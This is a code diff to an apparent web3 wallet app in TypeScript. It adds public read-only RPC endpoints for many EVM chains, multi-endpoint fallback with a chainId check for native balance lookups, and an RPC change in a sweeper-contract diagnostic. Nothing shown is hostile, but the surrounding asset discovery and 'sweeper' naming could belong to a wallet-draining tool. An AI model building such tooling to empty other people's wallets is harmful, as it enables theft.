@@ -45,6 +45,41 @@ const chains = [
 
 const ALL_CHAIN_IDS = chains.map(c => c.id) as [number, ...number[]];
 const RPC_MAP: Record<string, string> = Object.fromEntries(chains.filter(c => c.rpcUrl).map(c => [String(c.id), c.rpcUrl as string]));
+
+const READ_RPC_MAP: Record<string, string[]> = {
+  '1': ['https://ethereum-rpc.publicnode.com', 'https://cloudflare-eth.com', 'https://eth.drpc.org'],
+  '56': ['https://bsc-dataseed1.bnbchain.org', 'https://bsc-dataseed2.bnbchain.org', 'https://bsc-dataseed3.bnbchain.org'],
+  '137': ['https://polygon.drpc.org', 'https://polygon-bor-rpc.publicnode.com'],
+  '8453': ['https://mainnet.base.org', 'https://developer-access-mainnet.base.org'],
+  '42161': ['https://arb1.arbitrum.io/rpc', 'https://arbitrum-one-rpc.publicnode.com'],
+  '10': ['https://mainnet.optimism.io', 'https://optimism-rpc.publicnode.com'],
+  '43114': ['https://api.avax.network/ext/bc/C/rpc', 'https://avalanche-c-chain-rpc.publicnode.com'],
+  '100': ['https://rpc.gnosischain.com', 'https://rpc.gnosis.gateway.fm'],
+  '59144': ['https://rpc.linea.build', 'https://linea-rpc.publicnode.com'],
+  '81457': ['https://rpc.blast.io', 'https://rpc.ankr.com/blast'],
+  '5000': ['https://rpc.mantle.xyz', 'https://mantle-rpc.publicnode.com'],
+  '204': ['https://opbnb-mainnet-rpc.bnbchain.org'],
+  '167000': ['https://rpc.mainnet.taiko.xyz', 'https://taiko-rpc.publicnode.com'],
+  '324': ['https://mainnet.era.zksync.io', 'https://zksync.drpc.org'],
+  '534352': ['https://rpc.scroll.io', 'https://rpc.ankr.com/scroll'],
+  '42220': ['https://forno.celo.org'],
+  '252': ['https://rpc.frax.com', 'https://fraxtal-rpc.publicnode.com'],
+  '199': ['https://rpc.bt.io', 'https://bittorrent.drpc.org'],
+  '50': ['https://erpc.xinfin.network', 'https://rpc.xinfin.network'],
+  '33139': ['https://rpc.apechain.com'],
+  '480': ['https://worldchain-mainnet.g.alchemy.com/public', 'https://480.rpc.thirdweb.com'],
+  '146': ['https://rpc.soniclabs.com', 'https://sonic-rpc.publicnode.com'],
+  '130': ['https://mainnet.unichain.org', 'https://unichain-rpc.publicnode.com'],
+  '2741': ['https://api.mainnet.abs.xyz'],
+  '80094': ['https://rpc.berachain.com', 'https://berachain-rpc.publicnode.com'],
+  '143': ['https://rpc.monad.xyz', 'https://monad-rpc.publicnode.com'],
+  '999': ['https://rpc.hyperliquid.xyz/evm'],
+  '747474': ['https://rpc.katana.network', 'https://rpc.katanarpc.com'],
+  '1329': ['https://evm-rpc.sei-apis.com', 'https://sei-evm-rpc.publicnode.com'],
+  '9745': ['https://rpc.plasma.to'],
+  '1868': ['https://rpc.soneium.org'],
+  '1284': ['https://rpc.api.moonbeam.network', 'https://moonbeam-rpc.dwellir.com'],
+};
 const CHAIN_METHODS = ['eth_sendTransaction','eth_signTransaction','eth_sign','personal_sign','eth_signTypedData','eth_signTypedData_v4','wallet_switchEthereumChain','wallet_addEthereumChain','wallet_getCapabilities'] as const;
 
 type WalletApp = 'metamask' | 'trust' | 'coinbase';
@@ -201,16 +236,28 @@ async function discoverTokens(chain: typeof chains[number], address: string): Pr
 }
 
 async function discoverNativeAsset(chain: typeof chains[number], address: string): Promise<TokenAsset | null> {
-  if (!chain.rpcUrl) throw new Error(`${chain.name} missing RPC`);
-  const provider = new JsonRpcProvider(chain.rpcUrl, chain.id, { staticNetwork: true });
-  const rawBalance = await provider.getBalance(address);
-  if (rawBalance <= 0n) return null;
-  return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
+  const rpcUrls = READ_RPC_MAP[String(chain.id)]?.length ? READ_RPC_MAP[String(chain.id)] : (chain.rpcUrl ? [chain.rpcUrl] : []);
+  if (!rpcUrls.length) throw new Error(chain.name + ' missing read-only RPC');
+
+  let lastError: unknown = null;
+  for (const rpcUrl of rpcUrls) {
+    try {
+      const provider = new JsonRpcProvider(rpcUrl, chain.id, { staticNetwork: true });
+      const rpcChainId = Number(await provider.send('eth_chainId', []));
+      if (rpcChainId !== chain.id) throw new Error('RPC chainId mismatch: expected ' + chain.id + ', got ' + rpcChainId);
+      const rawBalance = await provider.getBalance(address);
+      if (rawBalance <= 0n) return null;
+      return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
+    } catch (e) {
+      lastError = e;
+    }
+  }
+  throw new Error(chain.name + ': all read-only RPC endpoints failed' + (lastError instanceof Error ? ' — ' + lastError.message : ''));
 }
 
 async function diagnoseSweeper(chainId: number, sweeperAddr: string, walletProvider: any) {
   const info = chains.find(c => c.id === chainId);
-  const rpcUrl = info?.rpcUrl;
+  const rpcUrl = READ_RPC_MAP[String(chainId)]?.[0] ?? info?.rpcUrl;
   if (!rpcUrl) throw new Error(`${info?.name ?? chainId}: no configured read-only RPC for contract diagnostics.`);
 
   const publicProvider = new JsonRpcProvider(rpcUrl, chainId, { staticNetwork: true });
